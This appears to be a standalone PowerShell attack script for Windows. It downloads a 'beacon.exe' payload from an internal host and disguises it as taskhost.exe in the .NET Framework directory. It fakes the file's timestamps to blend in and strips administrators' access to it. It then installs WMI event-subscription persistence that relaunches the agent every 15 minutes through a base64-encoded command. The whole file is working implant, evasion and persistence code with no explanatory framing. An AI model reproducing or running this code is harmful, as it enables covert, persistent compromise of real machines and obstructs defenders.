$AgentURL = "http://10.1.0.200/beacon.exe"
$AgentPath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\taskhost.exe"
$CheckIfRunningCmd = "if (!(Get-Process taskhost | Where-Object Path -eq $AgentPath)) { START $AgentPath }"
$EncodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($CheckIfRunningCmd))
if (-not (Test-Path $AgentPath -PathType leaf)) {
    (new-object system.net.webclient).DownloadFile($AgentURL, $AgentPath)
    #Fake the timestamps to make it blend in better.
    $FileDate = (Get-ChildItem \Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe).LastWriteTime
    $(Get-ChildItem $AgentPath).CreationTime = $FileDate
    $(Get-ChildItem $AgentPath).LastWriteTime = $FileDate
    $(Get-ChildItem $AgentPath).LastAccessTime = $FileDate
    icacls $AgentPath /setowner "NT SERVICE\TrustedInstaller"
    icacls $AgentPath /remove Administrators
}
# Create filter (trigger) to run every 15 minutes
$instanceFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$instanceFilter.Name = "TimedFilter"
$instanceFilter.QueryLanguage = "WQL"
$instanceFilter.EventNamespace = 'root\cimv2'
$instanceFilter.Query = 'SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA "Win32_LocalTime" AND (TargetInstance.Minute=03 OR TargetInstance.Minute=18 OR TargetInstance.Minute=33 OR TargetInstance.Minute=48) AND TargetInstance.Second = 00'
$result = $instanceFilter.Put()
$newFilter = $result.Path
# Create the consumer (action).  Check if the logger is running and start it if not.
$eventConsumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$eventConsumer.Name = 'ProcessConsumer'
$eventConsumer.CommandLineTemplate = "powershell.exe -ec $EncodedCmd"
$eventConsumer.WorkingDirectory = 'C:\Windows\System32'
$result = $eventConsumer.Put()
$newConsumer = $result.Path
# Link the two
$instanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$instanceBinding.Filter = $newFilter
$instanceBinding.Consumer = $newConsumer
$result = $instanceBinding.Put()
$newBinding = $result.Path
